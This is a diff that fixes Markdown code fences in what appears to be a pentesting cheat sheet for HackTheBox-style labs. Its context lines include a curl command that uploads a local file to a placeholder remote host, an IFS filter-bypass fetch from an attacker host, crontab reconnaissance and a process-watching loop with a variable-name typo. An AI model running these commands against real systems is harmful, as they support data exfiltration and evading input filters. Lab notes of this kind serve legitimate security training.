@@ -531,6 +531,7 @@ curl -F myFile=@<FILE> http://<RHOST>                                          /
 curl${IFS}<LHOST>/<FILE>                                                       // Internal Field Separator (IFS) example
 curl -I -X OPTIONS http://IP/Pagina/                                           // Check accepted methods
 ```
+
 ```c
  curl -s http://docker.hackthebox.eu:<puerto>/ -X POST -d hash=$(curl -s http://docker.hackthebox.eu:<puerto>/ -c cookie.txt | grep -oP "(?<=h3 align='center'>).*(?=</)" | tr -d "\n" | md5sum | tr -d -) -b cookie
 ```
@@ -8616,7 +8617,7 @@ for i in $(eo command); do echo $i; done
  
 ```c
 cat /etc/crontab
-```c
+```
 
 ```c
 #!/bin/bash
@@ -8641,7 +8642,7 @@ while true; do
         diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command"
         old_process=$new_porcess
 done
-``
+```
 
 Use of pspy to monitor linux process
 
